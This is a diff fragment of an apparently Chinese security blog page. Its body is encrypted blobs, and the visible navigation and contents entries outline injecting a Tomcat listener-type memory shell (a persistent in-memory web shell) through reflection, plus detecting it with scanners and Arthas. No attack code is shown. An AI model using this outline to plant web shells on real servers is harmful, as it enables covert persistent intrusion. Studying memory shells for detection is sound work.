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</div>
+<div class="hugo-encryptor-cipher-text" style="display: none;">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</div>
 </div>
 </article>
 </div>
 <div class="grow"></div>
 <nav class="pagination-single">
-<a class="pagination-single__left" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/owasp-benchmark%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/" title="OWASP Benchmark靶场搭建">
+<a class="pagination-single__left" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/" title="Tomcat的Filter型内存马研究">
 <div class="pagination-single__icon">
 <svg height="22" viewbox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" fill="currentColor"></path></svg>
 </div>
-<div class="pagination-single__right-title">OWASP Benchmark靶场搭建</div>
+<div class="pagination-single__right-title">Tomcat的Filter型内存马研究</div>
 </a>
 <div class="grow"></div>
-<a class="pagination-single__right" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%89%E8%A3%85tomcat-macos%E7%89%88/" title="安装Tomcat-macOS版">
-<div class="pagination-single__left-title">安装Tomcat-macOS版</div>
+<a class="pagination-single__right" href="http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6-%E8%AF%A6%E7%BB%86%E7%89%88/" title="Tomcat的servletAPI型内存马研究">
+<div class="pagination-single__left-title">Tomcat的servletAPI型内存马研究</div>
 <div class="pagination-single__icon">
 <svg height="22" viewbox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z" fill="currentColor"></path></svg>
 </div>
@@ -2876,10 +2761,10 @@ Java本身提供了Instrumentation类来实现<br/>
 <div class="toc__body">
 <nav id="TableOfContents">
 <ul>
-<li><a href="#创建恶意的servlet类">创建恶意的Servlet类</a></li>
-<li><a href="#获取当前的standardcontext">获取当前的StandardContext</a></li>
-<li><a href="#将恶意servlet封装成wrapper添加到standardcontext的children当中">将恶意servlet封装成wrapper添加到StandardContext的children当中</a></li>
-<li><a href="#添加servletmapping将访问的url和wrapper进行绑定">添加ServletMapping将访问的URL和wrapper进行绑定</a></li>
+<li><a href="#创建恶意类listenershell">创建恶意类<code>ListenerShell</code></a></li>
+<li><a href="#通过反射获取standardcontext对象">通过反射获取<code>StandardContext</code>对象</a></li>
+<li><a href="#调用standardcontextaddapplicationeventlistener方法将listenershell添加进去">调用<code>StandardContext#addApplicationEventListener</code>方法将<code>ListenerShell</code>添加进去</a></li>
+<li><a href="#完整代码">完整代码</a></li>
 </ul>
 <ul>
 <li><a href="#源码检测">源码检测</a>
@@ -2887,7 +2772,16 @@ Java本身提供了Instrumentation类来实现<br/>
 <li><a href="#内存马检测java-memshell-scanner">内存马检测java-memshell-scanner</a></li>
 </ul>
 </li>
-<li><a href="#内存马排查">内存马排查</a></li>
+<li><a href="#内存马排查">内存马排查</a>
+<ul>
+<li><a href="#arthashttpsarthasaliyuncomarthas-bootjar-排查"></a><a href="https://arthas.aliyun.com/arthas-boot.jar">Arthas</a> 排查</li>
+</ul>
